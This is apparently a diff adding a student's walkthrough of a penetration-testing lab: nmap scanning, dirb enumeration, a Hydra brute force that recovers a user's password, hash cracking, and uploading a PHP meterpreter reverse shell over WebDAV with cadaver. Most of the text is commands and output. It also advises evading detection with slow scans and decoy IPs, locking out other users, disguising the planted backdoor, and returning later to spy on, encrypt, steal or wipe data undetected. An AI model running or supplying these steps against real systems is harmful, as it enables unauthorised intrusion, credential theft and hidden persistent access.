@@ -1,0 +1,120 @@
+step 1:
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+port scan on entire network to find any ports/services that are exposed, be sure to scan all devices so as to find out which one is running the vulnerable server.
+
+$ nmap -sV -Pn -sS -oX <path/to/save/.xml> <ip-address/cidr>
+*ex. ran in metasploit
+			msf5 > db_nmap -sV -Pn -sS -oX /root/Desktop/intro-scan.xml 192.168.1.0/24
+
+**alternatively if you would rather save a greppable file you can use -oG instead just be sure to provide a valid path to save it.
+
+* -sV = service scan
+* -Pn = no-ping, this treats all hosts you scan as alive and doesnt send an ICMP Packet to verify.
+* -sS = SYN scan this type of scan only does a half-hand-shake so as to avoid making a full connection and giving yourself away to the target device.
+* -oX = save standard out as an .xml file, at the path provided you can also use -oG if you would like to save it as a greppable file thats easier to read in terminal
+** if you would like to stay quiet you can also use -T0 to make your packets get sent VERY slowly so its more difficult to find your ip in a sea of traffic.
+** another handy option to use if youre on a device that you would like to stay anon, and you are running a zombie you can use -D <decoy_IP/s>
+
+this port scan should result in the ip addresses of all the devices that are currently responding to your port scan and with that info you can find the one running
+the vulnerable server/service
+
+step 2:
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+open metasploit to do further DD and infect the Apache-server with a meterpreter reverse-shell
+**this is where having kali or parrot-os will come in handy.
+
+# service postgresql start
+**this is important just to be sure postgresql is running before starting the metasploit data base, if you dont it will throw you nasty errors
+
+# msfdb init
+**initializes the metasploit framework data-base
+
+# msfdb run
+**youll likely get a few messages saying that the database already started, thats what we want to see.
+
+the benefit of running your nmap scans from inside metsaploit is that it will save all the scan results to your hosts for you to refer back to later during the test
+
+# msf5 > hosts
+**shows you a list of all the hosts that showed up in the nmap scan results
+
+step 3:
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+now that we know that the vulnerable apache-server is running on the ip address 192.168.1.105 you can use a tool like dirb to iterate through all the directories being
+exposed to the running server (even ones that are hidden, think of this like pairing brute forcing with a word-list but for path manipulation)
+
+# dirb http://192.168.1.105/ -z 3000 -i -v -w 
+
+* -z = time (in ms) inbetween each attempt at the directories in wordlist
+* -i = case insensitive
+* -v = verbose
+* -w = ignore warning message on directories that dont exist
+** -H = you can use this to add a custom header to add for each HTML packet request
+
+step 4:
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+with the information obtained from the dirb scan, we should now be able to see something called */company_folders/secret_folder/
+
+this will however be asking for login information and saying "for ashton's eyes only"
+
+using this information we can assume that this will be for the user ashton who is on the 192.168.1.105 machine hosting the server.
+
+here we will be needing to wage a brute force attack against the apache server with "ashton" and the username and we will be using the rockyou.txt wordlist
+
+to find the rockyou word list in case you dont know where to start for looking you can always use: locate . rockyou | grep rockyou.txt and it should give you the path:
+/usr/share/wordlists/rockyou.txt.gz
+
+this means we will be needing to unzip the wordlist file using gunzip before using it for the brute force attack with hydra.
+
+now wage the hydra brute force attack on the vulnerable webserver with ashton as the username:
+
+# hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get http://192.168.1.105/company_files/secret_folder/
+
+* -l = login (username)
+* -P = path to the Passwordlist
+* -s = port the server is being hosted on
+* -f = exit when a login pair is found
+* -vV = very verbose
+* http-get <full/path/to/hidden/folder>
+
+with this hydra scan we should see that the results for the login creds are displayed at the bottom: 
+[80][http-get] host: 192.168.1.105 login: ashton password: leopoldo
+[STATUS] attack finished for 192.168.1.105 (valid pair found)
+
+step 5:
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+now with the login information we are going to be able to access the instructions that seem to be left for this user to access the webdav location on the server.
+
+we can immediately see what looks like a password hash for the sys user 'ryan' that we can crack using either john/hashcat/crackstation
+
+once this hash is cracked (make sure to leave out the "Hash": so that it can crack correctly) you should be shown the pass is: 'linux4u'
+
+with these steps well likely see an outdated ipaddress provided given we know that the ip address for the apache server is 192.168.1.105 so well go ahead and just
+add the location "dav://192.168.1.105/webdav/ as a location on our device using the creds. found above: [user: ryan | pass: linux4u]
+
+now that we have access to this directory we should see that there is a file located inside called passwd.dav and all this file is an md5 crypt hash for ryans password
+
+so its not too important now, however if we wanted to lock everyone else out of accessing that file we could either delete the passwd file or change it to your pass hash
+
+now that we have these two users password we will be able to either use metasploit or cadaver to post a reverse shell into the webserver.
+
+step 6:
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+using metasploit or cadaver to post the meterpreter reverse shell onto the vulnerable server, so see how to use metasploit to wage this attack see "msfdb_help.txt"
+
+using cadaver you will simply need to type:
+# cadaver http://192.168.105/webdav/
+
+then it will be asking you for the login creds that you now have access to and once entered you will want to make sure your in the same dir as your payload.
+
+send off your payload with cadaver by using the command:
+
+# dav:ryan> put <payload_name.php>
+
+if this payload was a reverse shell script, then this will essentially make it so that anytime that .php file gets clicked by any user it will run a reverse shell to 
+access whatever device is currently listening for a conection (attacker_machine).
+
+now that it has been uploaded you just want to make sure to disguise it well (keep in mind it will need to still be a .php to run) or just packup and dip and use it 
+later to open a reverse shell connection that will likely be difficult to detect because it will just look like the server is making an outbound connection to the 
+attacker device thats listening for the connection and its unlikly for that to be blocked by any firewalls or behaviour analysis. The implications of this reverse
+shell is that now whoever uses it is able to secure a more solid and undetectable connection to the server to spy/vandalize/crypt/steal/wipe data undetected by any 
+network analysts.
